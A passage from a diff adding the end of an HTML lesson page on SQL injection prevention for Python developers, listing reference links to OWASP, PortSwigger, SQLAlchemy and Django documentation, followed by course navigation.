+                    <div class="resource-note">The definitive reference for SQL injection prevention across all languages and frameworks. Covers parameterized queries, stored procedures, whitelist validation, and escaping.</div>
+                    
+                </a>
+                
+                <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener" class="resource-card">
+                    <div class="resource-type-tag tutorial">tutorial</div>
+                    <div class="resource-title">PortSwigger Web Security Academy: SQL Injection</div>
+                    
+                    <div class="resource-note">Hands-on interactive labs covering every SQL injection variant. Excellent for practicing both exploitation and defense in a safe environment.</div>
+                    
+                </a>
+                
+                <a href="https://docs.sqlalchemy.org/en/20/core/connections.html" target="_blank" rel="noopener" class="resource-card">
+                    <div class="resource-type-tag docs">docs</div>
+                    <div class="resource-title">SQLAlchemy Documentation: Engine and Connection Use</div>
+                    
+                    <div class="resource-note">Covers the correct way to use bound parameters, text() constructs, and the expression language to build safe queries in SQLAlchemy.</div>
+                    
+                </a>
+                
+                <a href="https://docs.djangoproject.com/en/5.0/topics/db/sql/" target="_blank" rel="noopener" class="resource-card">
+                    <div class="resource-type-tag docs">docs</div>
+                    <div class="resource-title">Django Documentation: Performing Raw SQL Queries</div>
+                    
+                    <div class="resource-note">Explains how to safely use raw SQL in Django, including Manager.raw(), cursor.execute() with parameters, and security warnings about string formatting.</div>
+                    
+                </a>
+                
+            </div>
+        </section>
+        
+
+        <div class="lesson-nav">
+            
+            <a href="/backend-learning/lesson/8.1.1-py.html" class="btn">&larr; OWASP Top 10 Overview for Python Developers</a>
+            
+            
+            <a href="/backend-learning/lesson/8.1.3-py.html" class="btn">XSS, CSRF, and SSRF: Understanding and Mitigating &rarr;</a>
+            
+        </div>
+
+        <div class="footer">
+            <a href="/backend-learning/phase/phase-8-py.html">&larr; Back to Security & Reliability</a>
+        </div>
+    </div>
+</body>
+</html>
